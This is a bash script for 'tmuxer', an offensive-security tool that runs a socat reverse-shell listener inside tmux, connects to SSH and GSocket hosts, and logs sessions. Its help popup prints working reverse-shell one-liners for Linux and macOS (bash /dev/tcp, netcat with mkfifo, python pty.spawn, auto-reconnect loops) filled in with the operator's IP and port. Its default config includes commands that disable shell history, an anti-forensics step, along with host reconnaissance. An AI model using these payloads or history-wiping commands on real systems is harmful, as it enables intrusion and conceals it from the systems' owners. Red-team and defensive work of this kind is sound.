#!/usr/bin/env bash

# ── defaults ──────────────────────────────────────────────────────────────────
PORT=""
LOGDIR="$HOME/tmuxer-logs"
TMUXER_LOG="$(date +%d%m%y).log"
PREPEND_SPACE=1
ORIG_ARGS=("$@")

# C3: Resolve symlinks to get the real script path (cross-platform)
if command -v realpath &>/dev/null; then
  SELF="$(realpath "$0")"
elif command -v readlink &>/dev/null && readlink -f "$0" &>/dev/null 2>&1; then
  SELF="$(readlink -f "$0")"
else
  SELF="$(cd "$(dirname "$0")" && pwd -P)/$(basename "$0")"
fi

LISTENER_PID_FILE="/tmp/tmuxer_listener.pid"

GSOCKET_HOSTS="$HOME/.gsocket/hosts"

# Config-sourced variables
listener_port=""
logdir=""
gsocket_hosts=""

# Host / command data
declare -a SSH_HOSTS
declare -a GS_ENTRIES # "name|description|secret"
declare -a CMD_NAMES
declare -a CMD_VALUES

# Data files (set at startup)
HOSTS_FILE=""
CMDS_FILE=""

POPUP_ACTION=""

# ── usage ─────────────────────────────────────────────────────────────────────
usage() {
  cat <<EOF
Usage: $(basename "$0") [OPTIONS] [port]

Options:
  -p, --port <port>       Port to listen on (overrides ~/.tmuxer.conf)
  --logdir <dir>          Log directory (default: ~/tmuxer-logs)
  --prepend-space         Prepend commands with a space (default: on)
  --no-prepend-space      Do not prepend commands with a space
  --install               Install as 'tmuxer' symlink in /usr/local/bin

Config: ~/.tmuxer.conf (shell-sourceable)
  listener_port=4444
  logdir=~/tmuxer-logs
  prepend_space=1
  cmd_1_name="Disable History"
  cmd_1="unset HISTFILE; export HISTFILESIZE=0; export HISTSIZE=0; set +o history"
  cmd_2_name="Quick Recon"
  cmd_2="id; uname -a; hostname"
  cmd_3_name="Full Recon"
  cmd_3="id; uname -a; w; netstat -tulip; ip a; arp -a; ip r; ps ax"

Host sources:
  ~/.ssh/config             — SSH Host entries
  \$GSOCKET_HOSTS (default ~/.gsocket/hosts) — name|description|secret
EOF
  exit 0
}

log() {
  echo "$@" >>"$LOGDIR/$TMUXER_LOG"
}

install() {
  # Create default config if missing (no root needed)
  local conf="$HOME/.tmuxer.conf"
  if [[ ! -f "$conf" ]]; then
    # TODO: extract the default config to a variable to use here and also in usage msg
    cat >"$conf" <<'CONFEOF'
# tmuxer config — shell-sourceable
listener_port=4444
logdir=$HOME/tmuxer-logs
prepend_space=1
gsocket_hosts=$HOME/.gsocket/hosts

cmd_1_name="Disable History"
cmd_1="unset HISTFILE; export HISTFILESIZE=0; export HISTSIZE=0; set +o history"

cmd_2_name="Quick Recon"
cmd_2="id; uname -a; hostname"

cmd_3_name="Full Recon"
cmd_3="id; uname -a; w; netstat -tulip; ip a; arp -a; ip r; ps ax"
CONFEOF
    echo "created $conf"
  else
    echo "config exists: $conf"
  fi

  # Create default gsocket hosts if missing
  # S2: use the already-defaulted uppercase variable
  local gs="$GSOCKET_HOSTS"
  local gsdir
  gsdir="$(dirname "$gs")"
  mkdir -p "$gsdir" 2>/dev/null
  if [[ ! -f "$gs" ]]; then
    cat >"$gs" <<'GSEOF'
# GSocket hosts — one entry per line, pipe-delimited
# Format: name|description|secret
#
# Example:
#   my-box|home desktop|mysecretkey
GSEOF
    chmod 600 "$gs"
    echo "created $gs"
  else
    echo "gsocket hosts exists: $gs"
  fi

  # Check perm on existing gsocket hosts
  if [[ -f "$gs" ]]; then
    local perms
    perms=$(stat -c '%a' "$gs" 2>/dev/null || stat -f '%Lp' "$gs" 2>/dev/null)
    if [[ "$perms" != "600" ]]; then
      echo "note: $gs has mode $perms (600 required)"
      echo "      run: chmod 600 $gs"
    fi
  fi

  # Install symlink (may need sudo)
  local dest=/usr/local/bin/tmuxer
  if [[ -L "$dest" ]]; then
    rm -f "$dest" 2>/dev/null || true
  fi
  if ln -s "$SELF" "$dest" 2>/dev/null; then
    echo "installed: $dest -> $SELF"
  else
    echo "note: config files created, but symlink needs sudo:"
    echo "      sudo $0 --install"
  fi
  exit 0
}

# ── dependency check ──────────────────────────────────────────────────────────
check_deps() {
  local missing=()
  command -v tmux &>/dev/null || missing+=("tmux")
  command -v socat &>/dev/null || missing+=("socat")
  command -v awk &>/dev/null || missing+=("awk")
  # TODO: check fzf as well ?
  if [[ ${#missing[@]} -gt 0 ]]; then
    echo "error: missing required tools: ${missing[*]}"
    exit 1
  fi
}

# ── config loading ────────────────────────────────────────────────────────────
load_config() {
  local config_file="$HOME/.tmuxer.conf"
  if [[ -f "$config_file" ]]; then
    source "$config_file"
  fi
  LOGDIR="${logdir:-$LOGDIR}"
  PREPEND_SPACE="${prepend_space:-$PREPEND_SPACE}"
  GSOCKET_HOSTS="${gsocket_hosts:-$GSOCKET_HOSTS}"
  if [[ -z "$PORT" ]] && [[ -n "$listener_port" ]]; then
    PORT="$listener_port"
  fi
}

parse_commands() {
  CMD_NAMES=()
  CMD_VALUES=()
  local i=1 name val
  while true; do
    name="cmd_${i}_name"
    val="cmd_${i}"
    [[ -z "${!name:-}" ]] && break
    CMD_NAMES+=("${!name}")
    CMD_VALUES+=("${!val:-}")
    ((++i))
  done
}

# ── SSH config parsing ────────────────────────────────────────────────────────
parse_ssh_config_file() {
  local file="$1" line in_match=0 h
  [[ -f "$file" ]] || return
  while IFS= read -r line || [[ -n "$line" ]]; do
    line="${line#"${line%%[![:space:]]*}"}"
    line="${line%"${line##*[![:space:]]}"}"
    [[ -z "$line" || "$line" == \#* ]] && continue
    # M4: Match block can be terminated by Host OR another Match line
    if [[ "$line" =~ ^[Mm]atch[[:space:]] ]]; then
      in_match=1
      continue
    fi
    if [[ $in_match -eq 1 ]]; then
      [[ "$line" =~ ^([Hh]ost|[Mm]atch)[[:space:]] ]] && in_match=0 || continue
    fi
    if [[ "$line" =~ ^[Ii]nclude[[:space:]]+(.+)$ ]]; then
      local pat="${BASH_REMATCH[1]}"
      pat="${pat//\~/$HOME}"
      for inc in $pat; do parse_ssh_config_file "$inc"; done
      continue
    fi
    if [[ "$line" =~ ^[Hh]ost[[:space:]]+(.+)$ ]]; then
      for h in ${BASH_REMATCH[1]}; do
        [[ "$h" == *\** || "$h" == *\?* || "$h" == *!* ]] && continue
        SSH_HOSTS+=("$h")
      done
    fi
  done <"$file"
}

parse_ssh_config() {
  SSH_HOSTS=()
  parse_ssh_config_file "$HOME/.ssh/config"
}

# ── GSocket hosts parsing ─────────────────────────────────────────────────────
parse_gsocket_hosts() {
  GS_ENTRIES=()
  local file="$GSOCKET_HOSTS" line name rest description secret
  [[ -f "$file" ]] || return 0
  # Require 600 permissions
  local perms
  perms=$(stat -c '%a' "$file" 2>/dev/null || stat -f '%Lp' "$file" 2>/dev/null)
  if [[ "$perms" != "600" ]]; then
    echo "error: $file must have mode 600 (current: $perms)"
    echo "       run: chmod 600 $file"
    exit 1
  fi
  while IFS='|' read -r name description secret; do
    [[ -z "$name" || -z "$secret" || "$name" == \#* ]] && continue
    GS_ENTRIES+=("$name|$description|$secret")
  done <"$file"
}

# ── reverse shells ────────────────────────────────────────────────────────────
# Compute and print revshell one-liners at display time (never stored in tmux
# options — tmux escapes $ to \$ in option values, breaking copy-paste).
_print_revshells() {
  local port ip
  port=$(tmux_gopt @tmuxer_port)
  ip=$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
  ip=${ip:-$(hostname -I 2>/dev/null | awk '{print $1}')}
  ip=${ip:-$(ifconfig 2>/dev/null | awk '/inet / && !/127\.0\.0\.1/{print $2;exit}')}
  ip=${ip:-"<your-ip>"}

  printf '\nReverse shells  [%s:%s]\n' "$ip" "$port"

  printf '\n  ── Linux ──\n'
  printf '  bash      bash -i >& /dev/tcp/%s/%s 0>&1\n' "$ip" "$port"
  printf '  nc        C="command -v";NC=$($C nc||$C ncat);F=/tmp/f$$;mkfifo $F;cat $F|sh -i 2>&1|$NC %s %s >$F;rm $F\n' "$ip" "$port"
  printf '  python    python3 -c "import socket,os,pty;s=socket.socket();s.connect((\047%s\047,%s));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\047/bin/bash\047)"\n' "$ip" "$port"
  printf '  reconnect while true;do C="command -v";SH=$($C bash||$C sh);NC=$($C nc||$C ncat);F=/tmp/f$$;mkfifo $F;cat $F|$SH -i 2>&1|$NC %s %s >$F;rm $F;sleep 3;done\n' "$ip" "$port"

  printf '\n  ── macOS ──\n'
  printf '  bash      bash -i >& /dev/tcp/%s/%s 0>&1\n' "$ip" "$port"
  printf '  nc        F=/tmp/f$$;mkfifo $F;sh -i <$F 2>&1|nc %s %s >$F;rm $F\n' "$ip" "$port"
  printf '  python    python3 -c "import socket,os,pty;s=socket.socket();s.connect((\047%s\047,%s));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\047/bin/zsh\047)"\n' "$ip" "$port"
  printf '  reconnect while true;do C="command -v";SH=$($C bash||$C sh);F=/tmp/f$$;mkfifo $F;$SH -i <$F 2>&1|nc %s %s >$F;rm $F;sleep 3;done\n' "$ip" "$port"
}

# ── tmux setup ────────────────────────────────────────────────────────────────
enforce_tmux() {
  if [[ -n "$TMUX" ]] && [[ -z "$TMUXER_OWNED_SESSION" ]]; then
    echo "error: refusing to run inside an existing tmux session"
    echo "       run from a plain terminal instead"
    exit 1
  fi
  if [[ -z "$TMUX" ]]; then
    exec tmux new-session -e TMUXER_OWNED_SESSION=1 -- "$0" "${ORIG_ARGS[@]}"
  fi
}

apply_tmux_settings() {
  tmux set-option -g history-limit 100000
  tmux set-option -g mouse on
  tmux set-window-option -g mode-keys vi
  tmux set-option -g escape-time 10
  tmux set-option -g monitor-activity on
  tmux set-option -g visual-activity off
  tmux set-option -g window-status-activity-style 'fg=black,bg=yellow,bold'
  tmux set-option -g status-right "F9→listen | %H:%M"
}

# ── tmux option helpers ───────────────────────────────────────────────────────
tmux_gopt() { tmux show-options -gv "$1" 2>/dev/null; }

# ── store runtime state in tmux session options ───────────────────────────────
store_tmux_options() {
  tmux set-option -g @tmuxer_port          "$PORT"
  tmux set-option -g @tmuxer_hosts_file    "$HOSTS_FILE"
  tmux set-option -g @tmuxer_cmds_file     "$CMDS_FILE"
  tmux set-option -g @tmuxer_prepend_space "$PREPEND_SPACE"
  tmux set-option -g @tmuxer_logdir        "$LOGDIR"
  tmux set-option -g @tmuxer_pid_file      "$LISTENER_PID_FILE"
  tmux set-option -g @tmuxer_self          "$SELF"
  tmux set-option -g @tmuxer_gs_hosts_file "$GSOCKET_HOSTS"

  # S7: warn on old tmux when fzf is absent
  if [[ -z "$(type -P fzf 2>/dev/null)" ]]; then
    local tmux_ver
    tmux_ver=$(tmux -V 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
    if [[ -z "$tmux_ver" ]] || [[ "$(printf '%s\n' "3.0" "$tmux_ver" | sort -V | head -1)" != "3.0" ]]; then
      echo "warning: tmux >= 3.0 recommended (have ${tmux_ver:-unknown})"
      echo "         install fzf for a better experience on older tmux"
    fi
  fi
}

# ── popup handlers (called via $SELF --popup <action>) ────────────────────────

_help_banner() {
  cat <<'HELPEOF'
┌─ tmuxer shortcuts ───────────────────────────────────────────────────────────┐
│  F1   show this help                                                         │
│  F2   host connector (SSH + GSocket) — type to filter, Enter to connect      │
│  F3   toggle raw mode (pty.spawn connections)                                │
│  F4   open session notes (~/notes/<session>-notes.md) in $EDITOR            │
│  F5   send commands (config-defined) — type to filter, Enter to send         │
│  F9   toggle reverse shell listener on/off                                   │
├──────────────────────────────────────────────────────────────────────────────┤
│  Mouse     scroll to enter copy mode · click to focus pane                   │
│  Vi keys   in copy mode: hjkl move · Space start sel · Enter copy · q quit   │
│  Paste     Ctrl-b ]                                                          │
│  Windows   Ctrl-b c new · Ctrl-b n/p next/prev · Ctrl-b & kill               │
│  Activity  inactive windows turn yellow in the status bar on new output      │
└──────────────────────────────────────────────────────────────────────────────┘
HELPEOF
}

popup_f1() {
  _help_banner
  _print_revshells
  printf '\nPress Enter to close...'
  read -r _
}

_add_gsocket_host() {
  local hosts_file gs_file name desc secret
  hosts_file=$(tmux_gopt @tmuxer_hosts_file)
  gs_file=$(tmux_gopt @tmuxer_gs_hosts_file)
  [[ -z "$gs_file" ]] && { echo "error: GSocket hosts file not configured" >&2; printf 'Press Enter...'; read -r _; return; }
  printf '\n── Add GSocket host ──────────────────────\n'
  printf 'Name (required):   '; read -r name
  [[ -z "$name" ]] && { echo "cancelled."; return; }
  [[ "$name" == *'|'* ]] && { echo "error: name cannot contain '|'"; printf 'Press Enter...'; read -r _; return; }
  printf 'Description:       '; read -r desc
  [[ "$desc" == *'|'* ]] && { echo "error: description cannot contain '|'"; printf 'Press Enter...'; read -r _; return; }
  printf 'Secret (required): '; read -r secret
  [[ -z "$secret" ]] && { echo "cancelled."; return; }
  [[ "$secret" == *'|'* ]] && { echo "error: secret cannot contain '|'"; printf 'Press Enter...'; read -r _; return; }
  printf '%s|%s|%s\n' "$name" "$desc" "$secret" >> "$gs_file"
  printf 'GS: %s (%s)|GS:%s|%s|%s\n' "$name" "$desc" "$name" "$desc" "$secret" >> "$hosts_file"
  printf 'added: %s\n' "$name"
  printf 'Press Enter...'; read -r _
}

_add_command() {
  local cmds_file name cmd next_n
  cmds_file=$(tmux_gopt @tmuxer_cmds_file)
  printf '\n── Add command ───────────────────────────\n'
  printf 'Name (required): '; read -r name
  [[ -z "$name" ]] && { echo "cancelled."; return; }
  [[ "$name" == *'|'* ]] && { echo "error: name cannot contain '|'"; printf 'Press Enter...'; read -r _; return; }
  printf 'Command:         '; read -r cmd
  [[ -z "$cmd" ]] && { echo "cancelled."; return; }
  next_n=$(( $(wc -l < "$cmds_file" 2>/dev/null || echo 0) + 1 ))
  printf '\ncmd_%d_name=%q\ncmd_%d=%q\n' "$next_n" "$name" "$next_n" "$cmd" >> "$HOME/.tmuxer.conf"
  printf '%s|%s\n' "$name" "$cmd" >> "$cmds_file"
  printf 'added: %s\n' "$name"
  printf 'Press Enter...'; read -r _
}

popup_f2() {
  local hosts_file fzf_bin sel action type rest
  hosts_file=$(tmux_gopt @tmuxer_hosts_file)
  fzf_bin=$(type -P fzf 2>/dev/null) || fzf_bin=""
  local ADD_NEW='[ + Add new GSocket host ]'

  if [[ -n "$fzf_bin" ]]; then
    sel=$({ [[ -s "$hosts_file" ]] && awk -F'|' '{print $1}' "$hosts_file"; printf '%s\n' "$ADD_NEW"; } \
      | fzf --color=dark --header='Hosts (type to filter, Enter=connect, Esc=cancel)' --height=20 --border)
    [[ -z "$sel" ]] && return
    if [[ "$sel" == "$ADD_NEW" ]]; then _add_gsocket_host; return; fi
    action=$(grep -m1 -F "$sel|" "$hosts_file" | cut -d'|' -f2-)
  else
    declare -a labels actions
    [[ -s "$hosts_file" ]] && while IFS='|' read -r label act; do
      [[ -z "$label" ]] && continue
      labels+=("$label"); actions+=("$act")
    done < "$hosts_file"
    labels+=("$ADD_NEW"); actions+=("ADD_NEW")
    echo "Hosts:"
    for i in "${!labels[@]}"; do printf '  %d) %s\n' $((i+1)) "${labels[$i]}"; done
    printf '\nSelect (1-%d, Enter=cancel): ' ${#labels[@]}
    read -r choice
    [[ -z "$choice" || ! "$choice" =~ ^[0-9]+$ ]] && return
    local idx=$((choice - 1))
    [[ $idx -ge 0 && $idx -lt ${#labels[@]} ]] || return
    action="${actions[$idx]}"
    if [[ "$action" == "ADD_NEW" ]]; then _add_gsocket_host; return; fi
  fi

  type="${action%%:*}"
  rest="${action#*:}"
  case "$type" in
    SSH)
      tmux display-message "Connecting to $rest..."
      tmux new-window -n "$rest" "ssh $rest || { echo; echo 'SSH failed (press Enter)'; read -r _; }"
      ;;
    GS)
      local gs_name gs_secret
      gs_name="${rest%%|*}"
      gs_secret="${rest##*|}"
      tmux display-message "Connecting to GS: $gs_name..."
      tmux new-window -n "$gs_name" "gs-netcat -s '$gs_secret' -i || { echo; echo 'GS failed (press Enter)'; read -r _; }"
      ;;
  esac
}

popup_f5() {
  local cmds_file prepend_space fzf_bin fifo sel cmd_val cmd_name
  cmds_file=$(tmux_gopt @tmuxer_cmds_file)
  prepend_space=$(tmux_gopt @tmuxer_prepend_space)
  fzf_bin=$(type -P fzf 2>/dev/null) || fzf_bin=""
  fifo=$(tmux show-options -wv @out_fifo 2>/dev/null)
  local ADD_NEW='[ + Add new command ]'

  if [[ -n "$fzf_bin" ]]; then
    sel=$({ [[ -s "$cmds_file" ]] && awk -F'|' '{print $1}' "$cmds_file"; printf '%s\n' "$ADD_NEW"; } \
      | fzf --color=dark --header='Commands (type to filter, Enter=send, Esc=cancel)' --height=20 --border)
    [[ -z "$sel" ]] && return
    if [[ "$sel" == "$ADD_NEW" ]]; then _add_command; return; fi
    cmd_val=$(grep -m1 -F "$sel|" "$cmds_file" | cut -d'|' -f2-)
    cmd_name="$sel"
  else
    declare -a names vals
    [[ -s "$cmds_file" ]] && while IFS='|' read -r name val; do
      [[ -z "$name" ]] && continue
      names+=("$name"); vals+=("$val")
    done < "$cmds_file"
    names+=("$ADD_NEW"); vals+=("ADD_NEW")
    echo "Commands:"
    for i in "${!names[@]}"; do printf '  %d) %s\n' $((i+1)) "${names[$i]}"; done
    printf '\nSelect (1-%d, Enter=cancel): ' ${#names[@]}
    read -r choice
    [[ -z "$choice" || ! "$choice" =~ ^[0-9]+$ ]] && return
    local idx=$((choice - 1))
    [[ $idx -ge 0 && $idx -lt ${#names[@]} ]] || return
    cmd_val="${vals[$idx]}"
    cmd_name="${names[$idx]}"
    if [[ "$cmd_val" == "ADD_NEW" ]]; then _add_command; return; fi
  fi

  if [[ -p "$fifo" ]]; then
    [[ "$prepend_space" == "1" ]] && printf ' %s\n' "$cmd_val" >> "$fifo" || printf '%s\n' "$cmd_val" >> "$fifo"
    tmux display-message "Sent: $cmd_name"
  else
    [[ "$prepend_space" == "1" ]] && tmux send-keys " $cmd_val" Enter || tmux send-keys "$cmd_val" Enter
    tmux display-message "Sent (keys): $cmd_name"
  fi
}

popup_f9() {
  local pid_file port logdir self
  pid_file=$(tmux_gopt @tmuxer_pid_file)
  port=$(tmux_gopt @tmuxer_port)
  logdir=$(tmux_gopt @tmuxer_logdir)
  self=$(tmux_gopt @tmuxer_self)

  if [[ -f "$pid_file" ]]; then
    local pid listener_win
    pid=$(head -1 "$pid_file" 2>/dev/null)
    listener_win=$(sed -n '2p' "$pid_file" 2>/dev/null)
    [[ -n "$pid" ]] && kill "$pid" 2>/dev/null
    sleep 0.2
    [[ -n "$pid" ]] && kill -9 "$pid" 2>/dev/null
    [[ -n "$listener_win" ]] && tmux kill-window -t "$listener_win" 2>/dev/null
    rm -f "$pid_file"
    tmux set-option -g status-right "F9→listen | %H:%M"
    tmux display-message "Listener stopped (:${port})"
    return
  fi

  local win_id listener_tty
  win_id=$(tmux new-window -P -F "#{window_id}" -n "listener" \
    "$self --popup listener; while sleep 3600; do :; done")
  sleep 0.3
  listener_tty=$(tmux display-message -p -t "$win_id" '#{pane_tty}')

  # M2: pass logdir via env var to avoid space-splitting in socat EXEC
  export LISTENER_TTY="$listener_tty"
  export HANDLER_LOGDIR="$logdir"
  export INIT_CMDS=""
  export PREPEND_SPACE

  socat TCP4-LISTEN:${port},reuseaddr,fork EXEC:"$self handler",nofork >/dev/null 2>&1 &
  local socat_pid=$!
  disown
  echo "$socat_pid" > "$pid_file"
  echo "$win_id" >> "$pid_file"
  tmux set-option -g status-right "LISTEN:$port | %H:%M"
  tmux display-message "Listener started on :$port"
}

popup_ctrlc() {
  local fifo
  fifo=$(tmux show-options -wv @out_fifo 2>/dev/null)
  [[ -p "$fifo" ]] && printf '\003' >> "$fifo"
}

popup_listener() {
  cat <<'INFOEOF'
┌─ tmuxer listener ────────────────────────────────────────────────────────────┐
│  F1   full help & shortcuts                                                  │
│  F2   host connector (SSH + GSocket)                                         │
│  F3   toggle raw mode (pty.spawn connections)                                │
│  F4   open session notes in $EDITOR                                          │
│  F5   send commands to active connection                                     │
│  F9   stop this listener                                                     │
├──────────────────────────────────────────────────────────────────────────────┤
│  Mouse     scroll to enter copy mode · click to focus pane                   │
│  Vi keys   in copy mode: hjkl move · Space start sel · Enter copy · q quit   │
│  Paste     Ctrl-b ]                                                          │
│  Windows   Ctrl-b c new · Ctrl-b n/p next/prev · Ctrl-b & kill               │
│  Activity  inactive windows turn yellow in the status bar on new output      │
└──────────────────────────────────────────────────────────────────────────────┘
INFOEOF
  _print_revshells
  printf '\n[*] Waiting for connections...\n'
}

# ── data files ────────────────────────────────────────────────────────────────
build_data_files() {
  HOSTS_FILE=$(mktemp /tmp/tmuxer_hosts_XXXXXX)
  # N3: cleaner display format — hostname only for SSH, "GS: name (desc)" for GS
  for h in "${SSH_HOSTS[@]}"; do
    echo "$h|SSH:$h"
  done >>"$HOSTS_FILE"
  for entry in "${GS_ENTRIES[@]}"; do
    local name="${entry%%|*}"
    local rest="${entry#*|}"
    local description="${rest%%|*}"
    local display="GS: $name ($description)"
    echo "$display|GS:$entry"
  done >>"$HOSTS_FILE"

  CMDS_FILE=$(mktemp /tmp/tmuxer_cmds_XXXXXX)
  for i in "${!CMD_NAMES[@]}"; do
    echo "${CMD_NAMES[$i]}|${CMD_VALUES[$i]}"
  done >>"$CMDS_FILE"
}

# ── keybindings ───────────────────────────────────────────────────────────────
bind_keys() {
  tmux bind-key -n F1 display-popup -E -w 90% -h 90% "$SELF --popup f1"
  tmux bind-key -n F2 display-popup -E -w 80% -h 80% "$SELF --popup f2"

  # F3: raw mode toggle
  tmux bind-key -n F3 if-shell -F '#{==:#{@raw_mode},1}' \
    'run-shell "stty sane < #{pane_tty}"; set-option -w @raw_mode 0; display-message "raw mode OFF — cooked restored"' \
    'run-shell "stty raw -echo < #{pane_tty}"; set-option -w @raw_mode 1; display-message "raw mode ON — pty.spawn active"'

  # F4: vertical split → open session notes in $EDITOR; pane auto-closes when editor exits
  tmux bind-key -n F4 split-window -h \
    'mkdir -p ~/notes && ${EDITOR:-vi} ~/notes/#{session_name}-notes.md'

  tmux bind-key -n F5 display-popup -E -w 80% -h 80% "$SELF --popup f5"
  tmux bind-key -n F9 run-shell -b "$SELF --popup f9"

  tmux bind-key -n C-c if-shell -F '#{==:#{window_index},0}' \
    'send-keys C-c' \
    "if-shell -F '#{==:#{@raw_mode},1}' \
      'run-shell \"$SELF --popup ctrlc\"' \
      'confirm-before -p \"Ctrl-C → remote? (y/n)\" \"run-shell \\\"$SELF --popup ctrlc\\\"\"'"

  # C1: kill listener before removing PID file so socat can still read it
  tmux set-hook session-closed "run-shell 'kill \$(cat $LISTENER_PID_FILE 2>/dev/null) 2>/dev/null; sleep 0.2; rm -f $LISTENER_PID_FILE $HOSTS_FILE $CMDS_FILE'"
}

# ── connection handler ────────────────────────────────────────────────────────
handle_connection() {
  local remote_ip="${SOCAT_PEERADDR:-unknown}"
  local in out logfile win_id new_pane_tty in_pid out_pid

  # M2: read logdir from env var (set by F9 popup) to avoid space-splitting
  local logdir="${HANDLER_LOGDIR:-}"

  echo "[+] incoming connection from $remote_ip" >"$LISTENER_TTY"

  in=$(mktemp -u /tmp/sock_in_XXXXXX)
  out=$(mktemp -u /tmp/sock_out_XXXXXX)
  mkfifo "$in" "$out"

  if [[ -n "$logdir" ]]; then
    mkdir -p "$logdir"
    logfile="$logdir/${remote_ip}-$(date +%d%m%y-%H%M%S).log"
    touch "$logfile"
  fi

  local probe_cmd="[ -t 0 ] && echo __PTY__ || echo __NOPTY__"
  [[ "$PREPEND_SPACE" == "1" ]] && printf ' %s\n' "$probe_cmd" || printf '%s\n' "$probe_cmd"

  win_id=$(tmux new-window -P -F "#{window_id}" -n "$remote_ip" \
    "echo '[*] connection from $remote_ip — [F5] commands'; echo '[F3] raw mode toggle'; trap 'stty sane; rm -f $in $out' EXIT; cat <$in & cat >$out; wait")

  tmux set-option -w -t "$win_id" @out_fifo "$out"
  sleep 0.1
  new_pane_tty=$(tmux display-message -p -t "$win_id" "#{pane_tty}")

  local pty_detected=0 probe_buf="" probe_line probe_start=$SECONDS
  while IFS= read -r -t 1 probe_line <&0 2>/dev/null; do
    [[ "$probe_line" == *"__PTY__"* ]] && {
      pty_detected=1
      break
    }
    [[ "$probe_line" == *"__NOPTY__"* ]] && break
    probe_buf+="$probe_line"$'\n'
    [[ $((SECONDS - probe_start)) -ge 3 ]] && break
  done

  if [[ $pty_detected -eq 1 ]]; then
    tmux set-option -w -t "$win_id" @raw_mode 1
    stty raw -echo <"$new_pane_tty"
    echo "[*] PTY detected on $remote_ip — raw mode enabled" >"$LISTENER_TTY"
    printf '[*] PTY detected — raw mode ON (F3 to toggle)\n' >"$new_pane_tty"
  else
    printf '[*] No PTY — use pty.spawn + F3 to upgrade\n' >"$new_pane_tty"
  fi

  if [[ -n "$logfile" ]]; then
    {
      printf '%s' "$probe_buf"
      cat <&0
    } |
      tee >(while IFS= read -r line; do printf '%s REMOTE: %s\n' "$(date '+%H:%M:%S')" "$line"; done >>"$logfile") >"$in" &
  else
    {
      printf '%s' "$probe_buf"
      cat <&0
    } >"$in" &
  fi
  in_pid=$!

  if [[ -n "$logfile" ]]; then
    cat <"$out" | tee >(while IFS= read -r line; do printf '%s USER:   %s\n' "$(date '+%H:%M:%S')" "$line"; done >>"$logfile") >&1 &
  else
    cat <"$out" >&1 &
  fi
  out_pid=$!

  # C4: portable wait without -n (bash < 4.3 / macOS compat); trap kills the
  # other process when either side closes
  _cleanup_conns() { kill "$in_pid" "$out_pid" 2>/dev/null; }
  trap _cleanup_conns EXIT
  wait $in_pid $out_pid 2>/dev/null
  trap - EXIT
  kill $in_pid $out_pid 2>/dev/null

  echo "[!] connection from $remote_ip closed" >"$LISTENER_TTY"
  echo "[!] connection closed" >"$new_pane_tty"
  [[ -n "$logfile" ]] && echo "[*] log saved to $logfile" >"$LISTENER_TTY"

  rm -f "$in" "$out"
}

# ── startup ───────────────────────────────────────────────────────────────────
start_tmuxer() {
  # S5: check required tools early
  check_deps

  load_config
  parse_commands
  parse_ssh_config
  parse_gsocket_hosts

  if [[ -z "$PORT" ]]; then
    echo "error: no port specified"
    echo "       set listener_port in ~/.tmuxer.conf or use --port"
    exit 1
  fi

  build_data_files

  enforce_tmux
  apply_tmux_settings
  store_tmux_options
  bind_keys

  tmux rename-window "local" 2>/dev/null

  mkdir -p "$LOGDIR"
  local_log="$LOGDIR/local-$(date +%d%m%y-%H%M%S).log"

  echo "[*] tmuxer ready — port :$PORT — F1 help | F9 listen"
  [[ -n "$LOGDIR" ]] && echo "[*] this session logging to $local_log"

  # M5: use canonical GNU script argument order; N5: drop 2>/dev/null so
  # failures are visible
  if command -v script &>/dev/null; then
    if script /dev/null -c true >/dev/null 2>&1; then
      exec script -q -c bash "$local_log"
    else
      exec script -q "$local_log" bash
    fi
    echo "script exec failed, log: $local_log" >>/tmp/tmuxer_script_err.log
    exec bash
  else
    exec bash
  fi
}

# ── CLI args ──────────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case "$1" in
  -h | --help) usage ;;
  --install) install ;;
  handler)
    MODE=handler
    shift
    # M2: logdir is now passed via HANDLER_LOGDIR env var; positional arg kept
    # for backward compatibility
    HANDLER_LOGDIR="${HANDLER_LOGDIR:-${1:-}}"
    shift
    ;;
  --popup)
    MODE=popup
    POPUP_ACTION="${2:-}"
    shift 2
    ;;
  --logdir)
    LOGDIR="$2"
    shift 2
    ;;
  --no-prepend-space)
    PREPEND_SPACE=0
    shift
    ;;
  --prepend-space)
    PREPEND_SPACE=1
    shift
    ;;
  --port | -p)
    PORT="$2"
    shift 2
    ;;
  *)
    PORT="$1"
    shift
    ;;
  esac
done

# ── dispatch ──────────────────────────────────────────────────────────────────
case "$MODE" in
  handler)
    handle_connection
    ;;
  popup)
    case "$POPUP_ACTION" in
      f1)       popup_f1 ;;
      f2)       popup_f2 ;;
      f5)       popup_f5 ;;
      f9)       popup_f9 ;;
      ctrlc)    popup_ctrlc ;;
      listener) popup_listener ;;
      *)        echo "unknown popup action: $POPUP_ACTION" >&2; exit 1 ;;
    esac
    ;;
  *)
    export LOGDIR
    export PREPEND_SPACE
    start_tmuxer
    ;;
esac
